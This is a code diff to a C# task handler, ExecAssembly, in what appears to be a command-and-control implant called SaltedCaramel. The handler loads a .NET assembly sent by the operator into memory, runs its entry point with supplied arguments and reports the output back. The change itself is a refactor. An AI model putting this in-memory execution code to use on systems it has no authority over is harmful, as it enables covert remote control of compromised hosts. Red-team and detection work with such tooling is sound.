@@ -1,13 +1,15 @@
 ﻿using Newtonsoft.Json;
 using Newtonsoft.Json.Linq;
 using Reflection = System.Reflection;
+using SaltedCaramel.Jobs;
 
 namespace SaltedCaramel.Tasks
 {
     class ExecAssembly
     {
-        public static void Execute(SCTask task, SCImplant implant)
+        public static void Execute(Job job, SCImplant implant)
         {
+            SCTask task = job.Task;
             JObject json = (JObject)JsonConvert.DeserializeObject(task.@params);
             string file_id = json.Value<string>("file_id");
             string[] args = json.Value<string[]>("args");
@@ -15,8 +17,8 @@ namespace SaltedCaramel.Tasks
             Reflection.Assembly assembly = Reflection.Assembly.Load(assemblyBytes);
             string result = assembly.EntryPoint.Invoke(null, args).ToString();
 
-            implant.Profile.PostResponse(new SCTaskResp(task.id, result));
-            implant.Profile.SendComplete(task.id);
+            implant.TryPostResponse(new SCTaskResp(task.id, result));
+            implant.TrySendComplete(job);
         }
     }
 }
